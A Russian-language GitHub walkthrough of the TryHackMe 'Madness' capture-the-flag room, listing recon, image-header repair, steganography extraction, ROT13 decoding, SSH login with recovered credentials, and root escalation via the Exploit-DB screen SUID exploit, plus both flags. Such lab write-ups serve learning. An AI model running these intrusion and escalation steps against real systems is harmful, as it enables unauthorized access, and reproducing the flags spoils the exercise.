[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Madness](https://tryhackme.com/r/room/madness) 

Всего 1 заданиe:
## Задание 1
Обратите внимание, что для этого задания не требуется перебор паролей SSH.

Используйте свои навыки, чтобы получить доступ к учетной записи пользователя и root!
### Ответьте на вопросы ниже
пользователь.txt 
[secret.py](https://github.com/BEPb/tryhackme/blob/master/01.easy/Madness/secret.py)
```commandline
nmap -sC -sV <IP>
curl -s http://<IP>
wget http://<IP>/thm.jpg
xxd thm.jpg | head
printf '\xff\xd8\xff\xe0\x00\x10\x4a\x46\x49\x46\x00\x01' | dd conv=notrunc of=thm.jpg bs=1
curl -s http://<IP>/th1s_1s_h1dd3n/
curl -s http://<IP>/th1s_1s_h1dd3n/?secret=34
python secret.py
# y2RPJ4QaPF!B 
steghide info thm.jpg
steghide extract -sf thm.jpg
cat hidden.txt
# wbxre
echo -n "wbxre" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
# joker
wget https://<IP>/5iW7kC8.jpg
steghide info 5iW7kC8.jpg
steghide extract -sf 5iW7kC8.jpg
cat password.txt
sshpass -p "*axA&GF8dP" ssh joker@<IP>
cat user.txt 
```
```commandline
THM{d5781e53b130efe2f94f9b0354a5e4ea}
```
корень.txt
```commandline
find / -user root -perm -u=s 2>/dev/null
ls -l /bin/screen*
# https://www.exploit-db.com/exploits/41154
sh 41154.sh 
cat /root/root.txt
```
```commandline
THM{5ecd98aa66a6abb670184d7547c8124a}
```


[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)